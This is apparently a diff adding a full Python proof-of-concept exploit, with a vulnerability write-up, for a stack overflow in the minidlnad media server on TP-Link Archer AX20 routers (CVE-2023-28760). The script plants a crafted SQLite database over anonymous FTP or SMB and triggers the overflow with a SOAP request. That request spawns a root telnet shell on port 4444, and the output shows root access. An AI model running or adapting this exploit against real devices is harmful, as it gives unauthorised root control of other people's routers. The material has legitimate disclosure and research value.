@@ -1,0 +1,362 @@
+#!/usr/bin/env python3
+"""
+TP-Link Archer AX20 minidlnad db_dir Remote Code Execution Vulnerability
+Prepared by Rocco Calvi & Steven Seeley of Incite Team
+CVE: CVE-2023-28760
+
+## Summary
+
+A pre-authenticated attacker on the LAN can trigger a remote code execution
+against the router as the root user.
+
+## Vulnerability Analysis
+
+The vulnerability resides in the fact that the `files.db` file is
+modifiable by remote attackers. This is due to the fact that the `db_dir` 
+property is set to a location that is modifiable via smb or ftp.
+
+```
+root@Archer_AX20:~# cat /tmp/minidlna.conf 
+# this file is generated automatically, don't edit
+...
+db_dir=/mnt/sda1/.TPDLNA
+...
+```
+
+Due to this, several primitives can be used inside of minidlnad to read files 
+and/or trigger a stack based-buffer overflow.
+ 
+The overflow triggers from a `sprintf` call in `minidlna-1.1.2/upnpsoap.c`:
+
+```c
+ret = sqlite3_exec(db, sql, callback, (void *) &args, &zErrMsg); // 1
+...
+static int
+callback(void *args, int argc, char **argv, char **azColName)
+...
+*dlna_pn = argv[20], // 2
+...
+if( strncmp(class, "item", 4) == 0 ) // 3
+...
+if( *mime == 'v' ) // 4
+...
+case ESonyBravia: // 5
+...
+strncmp(dlna_pn, "AVC_TS_HP_HD_AC3", 16) == 0)) // 6
+...
+sprintf(dlna_buf, "DLNA.ORG_PN=AVC_TS_HD_50_AC3%s", dlna_pn + 16); // 7
+```
+
+At [1], the `callback` method is called after an SQL query is executed against
+the `details` table. Since the attacker controls the DB file, query results 
+are also attacker controlled at [2]. If the `class` starts with 'item' then 
+the attack continues at [3].
+
+Later in the code at [4], there is a switch statement based on the mime type 
+stored in the database and the client user agent or HTTP header at [5]. Then 
+at [6], the code checks that the `dlna_pn` blog begins with the string 
+'AVC_TS_HP_HD_AC3' and if so, attempts to copy data to a fixed-size buffer on 
+the stack at [7].
+
+This can allow an attacker to gain remote code execution if the media server is
+enabled with access to the share via samba or FTP.
+
+## Notes
+
+- This bug requires that a USB flash drive is connected to the router
+  1. With anonymous access via smb and/or ftp enabled  (default)
+  2. Media sharing enabled (default)
+  
+- Minidlna V1.1.2 on the system, however the stack-based buffer overflow is
+  available in the latest version at the time of writing this exploit
+
+- The exploit requires:
+  - pip3 install pysmb
+  - pip3 install requests
+
+## Exploitation
+
+The system has ASLR enabled coupled with the NX bit set. Additionally sprintf()
+restricts our payload to not include null bytes. This makes exploitation
+difficult but not impossible. It's still possible to redirect execution to a
+single instruction, as the attacker can perform a partial overwrite and retain a
+null byte.
+
+This exploit redirects execution to the following location to demonstrate RCE
+capability:
+
+```
+00015ed4 06 0d 8d e2     add        r0,sp,#0x180
+00015ed8 cb f6 ff eb     bl         <EXTERNAL>::system      int system(char * __command)
+```
+
+We just use the HTTP SOAP request to store our system argument on the stack so
+that at offset 0x180, we have our command to run :D
+
+Also, we implemented a hash check on the binary to comfirm if exploitation will
+work or not, incase other models out there are vulnerable that we are unable to
+verify at the time...
+
+## Example
+
+### Usage
+```
+steven@mars:~/PWN2OWN/archer/exploit$ ./poc.py 
+---> TP-Link AX1800 WiFi 6 Router (Archer AX20) RCE Explo!t <---
+         By Rocco Calvi and Steven Seeley of Incite Team
+
+(+) ./poc.py <target> <proto>
+(+) eg: ./poc.py 192.168.1.1 ftp
+(+) eg: ./poc.py 192.168.1.1 smb
+```
+
+### Vulnerable target
+
+```
+steven@mars:~$ ./poc.py 
+---> TP-Link AX1800 WiFi 6 Router (Archer AX20) RCE Explo!t <---
+         By Rocco Calvi and Steven Seeley of Incite Team
+
+(+) ./poc.py <target> <proto>
+(+) eg: ./poc.py 192.168.1.1 ftp
+(+) eg: ./poc.py 192.168.1.1 smb
+steven@mars:~$ ./poc.py 192.168.1.1 ftp
+---> TP-Link AX1800 WiFi 6 Router (Archer AX20) RCE Explo!t <---
+         By Rocco Calvi and Steven Seeley of Incite Team
+
+(+) preparing target stack...
+(+) creating db connection...
+(+) creating db structure...
+(+) create payload...
+(+) updating db...
+(+) uploading the db via ftp...
+(+) checking target...
+(+) target is vulnerable!
+(+) triggering overflow...
+(+) pop thy shell!
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+
+BusyBox v1.19.4 (2021-12-31 19:43:54 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/ # id
+uid=0(root) gid=0(root)
+/ # uname -a
+Linux Archer_AX20 4.1.52 #1 SMP PREEMPT Fri Dec 31 18:57:02 CST 2021 armv7l GNU/Linux
+```
+
+### Non-vulnerable target
+
+```
+steven@mars:~$ ./poc.py 192.168.1.1 ftp
+---> TP-Link AX1800 WiFi 6 Router (Archer AX20) RCE Explo!t <---
+         By Rocco Calvi and Steven Seeley of Incite Team
+
+(+) preparing target stack...
+(+) creating db connection...
+(+) creating db structure...
+(+) create payload...
+(+) updating db...
+(+) uploading the db via ftp...
+(+) checking target...
+(+) target is NOT likley vulnerable!
+```
+
+## Debugging
+
+```
+Thread 1 received signal SIGSEGV, Segmentation fault.
+0x24242424 in ?? ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────
+$r0  : 0x0       
+$r1  : 0x03a7aa  →  0x746c2600
+$r2  : 0x0       
+$r3  : 0x441     
+$r4  : 0x41414141 ("AAAA"?)
+$r5  : 0x41414141 ("AAAA"?)
+$r6  : 0x41414141 ("AAAA"?)
+$r7  : 0x41414141 ("AAAA"?)
+$r8  : 0x41414141 ("AAAA"?)
+$r9  : 0x41414141 ("AAAA"?)
+$r10 : 0x41414141 ("AAAA"?)
+$r11 : 0x41414141 ("AAAA"?)
+$r12 : 0xd9ffc48b
+$sp  : 0xbecf5e48  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$lr  : 0x01c3f4  →  0xea00000a ("\n"?)
+$pc  : 0x24242424 ("$$$$"?)
+$cpsr: [negative zero CARRY overflow interrupt fast thumb]
+───────────────────────────────────────────────────────────────────────────────
+0xbecf5e48│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $sp
+0xbecf5e4c│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xbecf5e50│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xbecf5e54│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xbecf5e58│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xbecf5e5c│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xbecf5e60│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xbecf5e64│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+───────────────────────────────────────────────────────────────────────────────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x24242424
+───────────────────────────────────────────────────────────────────────────────
+[#0] Id 1, stopped 0x24242424 in ?? (), reason: SIGSEGV
+[#1] Id 2, stopped 0xb6afa37c in poll (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────
+(remote) gef➤
+```
+"""
+
+import os
+import sys
+import time
+import socket
+import struct
+import urllib
+import sqlite3
+import hashlib
+import requests
+from ftplib import FTP
+from threading import Thread
+from colorama import Fore, Style
+from smb.SMBHandler import SMBHandler
+
+def insert_into_db(conn, buffer, object_id):
+    cur = conn.cursor()
+    sql_details = "insert or replace into details( \
+    id, path, size, timestamp, title, duration, bitrate, samplerate, creator, \
+    artist, album, genre, comment, channels, disc, track, date, resolution, \
+    thumbnail, album_art, rotation, dlna_pn, mime) values(?, null, null, null, \
+    null, null, null, null, null, null, null, null, null, null, null, null, null, \
+    null, null, null, null, ?, 'vendetta')"
+    cur.execute(sql_details, (object_id, buffer, ))
+    sql_objects = "insert or replace into objects( \
+    id, object_id, parent_id, ref_id, class, detail_id, name) values(null, ?, \
+    '', null, 'item.videoItem', ?, null)"
+    cur.execute(sql_objects, (object_id, object_id, ))
+    cur.execute("insert into album_art (id, path) values (?, \
+    '/usr/sbin/minidlnad');", (object_id,))
+    
+def upload_via_smb(target, db_file):
+    assert os.path.isfile(db_file), "(-) faild to find the database file!"
+    opener = urllib.request.build_opener(SMBHandler)
+    opener.open(f'smb://{target}/G/.TPDLNA/{db_file}', open(f"{db_file}", 'rb')).close()
+
+def upload_via_ftp(target, db_file):
+    assert os.path.isfile(db_file), "(-) faild to find the database file!"
+    ftp = FTP(target)
+    ftp.encoding = "utf-8"
+    ftp.login()
+    ftp.cwd('G/.TPDLNA') 
+    with open(db_file, 'rb') as fp:
+        ftp.storbinary(f'STOR {db_file}', fp)
+    ftp.quit()
+
+def build_payload():
+    bof = b"AVC_TS_HP_HD_AC3"
+    bof += b"A" * 136
+    bof += struct.pack("I", 0x00015ed4) # $pc
+    bof += b"A" * (250-len(bof))
+    return bof
+
+def create_db_structure(conn):
+    create_objects = "create table if not exists objects (id integer primary \
+    key autoincrement, object_id text unique not null, parent_id text not \
+    null, ref_id text default null, class text not null, detail_id integer \
+    default null, name text default null)"
+    create_details = "create table if not exists details (id integer primary \
+    key autoincrement, path text default null, size integer, timestamp \
+    integer, title text collate nocase, duration text, bitrate integer, \
+    samplerate integer, creator text collate nocase, artist text collate \
+    nocase, album text collate nocase, genre text collate nocase, comment \
+    text, channels integer, disc integer, track integer, date date, \
+    resolution text, thumbnail bool default 0, album_art integer default 0, \
+    rotation integer, dlna_pn text, mime text)"
+    create_album_art = "create table if not exists album_art (id integer \
+    primary key autoincrement, path text not null)"
+    cur = conn.cursor()
+    cur.execute(create_objects)
+    cur.execute(create_details)
+    cur.execute(create_album_art)
+
+def trigger_overflow(target, object_id):
+    url = f"http://{target}:8200/ctl/ContentDir"
+    h = {
+        'x-av-client-info' : 'BRAVIA',
+        'content-type'     : 'text/xml',
+        'soapaction'       : 'urn:schemas-upnp-org:service:ContentDirectory:1#BrowseContentDirectory'
+    }
+    cmd = "/usr/sbin/telnetd -p4444 -l/bin/sh"
+    # don't change this, its crafted to land the command on the stack at offset 0x180
+    body = f"""<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" \
+         s:rce="{cmd}\x00" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+        <s:Body><u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1">
+            <ObjectID>{object_id}</ObjectID>
+            <BrowseFlag>BrowseMetadata</BrowseFlag>
+                <Filter>*</Filter>
+            </u:Browse>
+        </s:Body>
+    </s:Envelope>"""
+    try:
+        requests.post(url, data=body, headers=h)
+    except:
+        pass
+
+def is_vulnerable(target, object_id):
+    m = hashlib.sha256()
+    # first one is used for caching, will return 404
+    requests.get(f"http://{target}:8200/AlbumArt/{object_id}-si.jpg")
+    # now we process the hash check
+    r = requests.get(f"http://{target}:8200/AlbumArt/{object_id}-si.jpg")
+    m.update(r.content)
+    with open("/tmp/minidlnad", "wb") as minid:
+        minid.write(r.content)
+    return m.hexdigest() == "13b5db4fa126331aaab6fcb02b31a730932debfc2785767863982e551389614e"
+
+def main(target, proto):
+    print("(+) preparing target stack...")
+    c = {"sysauth":"incite"}
+    p = {"form":"login"}
+    requests.post(f"http://{target}/cgi-bin/luci/;stok=/login", cookies=c, params=p)
+    print("(+) creating db connection...")
+    conn = sqlite3.connect("files.db")
+    print("(+) creating db structure...")
+    create_db_structure(conn)
+    print("(+) create payload...")
+    bof = build_payload()
+    print("(+) updating db...")
+    insert_into_db(conn, bof, 1337)
+    conn.commit()
+    print(f"(+) uploading the db via {proto}...")
+    if proto == "smb":
+        upload_via_smb(target, "files.db")
+    elif proto == "ftp":
+        upload_via_ftp(target, "files.db")
+    print("(+) checking target...")
+    if is_vulnerable(target, 1337):  
+        print(f"(+) {Fore.GREEN + Style.BRIGHT}target is vulnerable!{Style.RESET_ALL}")
+        print(f"(+) triggering overflow...")
+        handlerthr = Thread(target=trigger_overflow, args=[target, 1337])
+        handlerthr.daemon = True
+        handlerthr.start()
+        time.sleep(0.5)
+        print(f"(+) {Fore.RED + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
+        os.system(f"telnet {target} 4444")      
+    else:
+        print(f"(+) {Fore.RED + Style.BRIGHT}target is NOT likley vulnerable!{Style.RESET_ALL}")
+
+if __name__ == "__main__":
+    print("""---> TP-Link AX1800 WiFi 6 Router (Archer AX20) RCE Explo!t <---
+         By Rocco Calvi and Steven Seeley of Incite Team\r\n""")
+    if len(sys.argv) <= 2:
+        print(f"(+) {sys.argv[0]} <target> <proto>")
+        print(f"(+) eg: {sys.argv[0]} 192.168.1.1 ftp")
+        print(f"(+) eg: {sys.argv[0]} 192.168.1.1 smb")
+        exit(1)
+    target = sys.argv[1]
+    proto = sys.argv[2].lower()
+    assert proto in ["ftp", "smb"], "(-) not a valid protocol to use!"
+    if os.path.exists("files.db"): os.remove("files.db")
+    main(target, proto)
